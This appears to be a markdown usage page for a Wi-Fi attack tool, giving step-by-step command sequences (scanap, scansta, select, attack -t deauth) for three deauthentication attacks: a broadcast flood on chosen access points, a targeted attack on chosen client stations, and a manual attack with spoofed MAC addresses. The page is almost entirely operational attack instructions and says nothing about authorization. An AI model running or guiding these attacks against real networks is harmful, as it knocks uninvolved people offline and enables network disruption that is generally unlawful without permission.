# Deauthentication Attack workflow

- [Deauthentication Flood](#deauthentication-flood)
- [Targeted Deauthentication Attack](#targeted-deauthentication-attack)
- [Manual Deauthentication Attack](#manual-deauthentication-attack)

## Deauthentication Flood
This attack will broadcast deauthentication frame to all clients connected to a target access point.  
The following describes the order of operations necessary to properly execute this attack.  

1. Build list of target access points
    - `scanap`  
![image](https://user-images.githubusercontent.com/25190487/209213624-5931cda6-9403-4f53-bf5a-677022729ebd.png)  
2. Display list of available access points
    - `list -a`  
![image](https://user-images.githubusercontent.com/25190487/209213778-bac11c84-2fe9-4b36-ba7e-29ab2656069f.png)  
3. Select a target access points from the list. Multiple access points may be specified
    - `select -a 0,1`  
4. Verify access points 0 and 1 have been selected with `list`
    - `list -a`  
![image](https://user-images.githubusercontent.com/25190487/209214000-921ef838-c437-4afb-8207-2c6add8318fd.png)  
5. Execute deauthentication flood against the targeted access points
    - `attack -t deauth`  
![image](https://user-images.githubusercontent.com/25190487/209214184-80b2b9dc-f226-4404-9ccf-1475354fdc2a.png)  

## Targeted Deauthentication Attack
This attack is intended to target only specific stations connected to a targeted access point rather than sending deauth frames to broadcast. Multiple stations and access points can be specified for a single attack. While it is possible to select many stations even when they are associated with different access points, only selected stations associated with selected access points will be targeted. If a station is selected but its associated access point is not, it will not be attacked.   
The following describes the order of operations necessary to properly execute this attack. 

1. Build list of target access points
    - `scanap`  
![image](https://user-images.githubusercontent.com/25190487/209213624-5931cda6-9403-4f53-bf5a-677022729ebd.png)  
2. Display list of available access points
    - `list -a`  
![image](https://user-images.githubusercontent.com/25190487/209213778-bac11c84-2fe9-4b36-ba7e-29ab2656069f.png)  
3. Select a target access points from the list. Multiple access points may be specified
    - `select -a 0,1`  
4. Verify access points 0 and 1 have been selected with `list`
    - `list -a`  
![image](https://user-images.githubusercontent.com/25190487/209214000-921ef838-c437-4afb-8207-2c6add8318fd.png)  
5. Build list of target stations
    - `scansta`  
![image](https://user-images.githubusercontent.com/25190487/209215811-b9568e0d-6ec3-4f72-96bb-1b4798c7cc3f.png) 
6. Display list of available stations 
    - `list -c`  
![image](https://user-images.githubusercontent.com/25190487/209217969-dcd0ea60-075f-4d0d-a746-546796a59e37.png)  
7. Select target stations from the list. Multiple stations may be specified
    - `select -c 0,12`  
8. Verify stations 0 and 12 have been selected with `list`
    - `list -c`  
![image](https://user-images.githubusercontent.com/25190487/209218435-61722862-5753-4bb2-8ec1-d59499b7b163.png)
9. Execute deauthentication flood against the targeted access points
    - `attack -t deauth -c`  
![image](https://user-images.githubusercontent.com/25190487/209218662-79c33727-5b7c-49c2-9e6d-af614bc8469d.png)  

## Manual Deauthentication Attack
With this attack, the source and destination address of each frame is manually set by the user. This attack does not require any scans to be performed.  
The following describes the order of operations necessary to properly execute this attack.  

1. Execute manual deauthentication attack
    - `attack -t deauth -s 00:00:00:00:00:00 -d ff:ff:ff:ff:ff:ff`